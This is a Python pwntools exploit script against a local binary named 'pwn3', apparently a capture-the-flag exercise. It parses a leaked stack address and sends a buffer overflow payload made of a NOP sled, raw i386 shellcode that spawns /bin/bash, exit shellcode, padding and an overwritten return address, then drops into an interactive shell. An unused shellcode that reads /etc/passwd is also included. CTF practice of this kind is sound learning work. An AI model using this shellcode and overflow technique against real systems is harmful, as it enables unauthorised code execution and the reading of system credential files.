from pwn import *
import argparse

parser = argparse.ArgumentParser()
#parser.add_argument("--offset", type=int, required=True)
#parser.add_argument("--buffer_offset", type=int, required=True)
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

context.arch='i386'

io = process('./pwn3')

cat_paswd_shellcode = (b"\xb8\xff\xff\xff\xff\x40\x99\x8d\x5c\x24\xf4\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x4b\xf0\x52\x68\x74\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x66\xb8\x2f\x4a\x52\x80\x74\x24\x0c\x07\x51\x53\x89\xe1\x66\x25\x8b\x35\xcd\x80")
exit_shellcode = (b"\x31\xdb\xf7\xe3\x40\x0f\x05")
sh_shellcode = (b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

leak = io.recvuntil(b"!\n")
leak = str(leak).split(" ")[9]
leak = leak.replace("!\\n'","")
leak = int(leak,16) #convert str to int more precisely to hex
log.success("Buffer start address: "+str(leak))

payload = b""
payload += b"\x90" *16
#payload += cat_paswd_shellcode
payload += sh_shellcode
payload += exit_shellcode
payload += b"A" * (302 - len(payload)) # 16 - len(cat_paswd_shellcode) - len(exit_shellcode)
payload += p32(leak)

#log.info("Dumping /etc/passwd file")
log.info("Popping a shell...")

io.sendline(payload)

io.interactive()
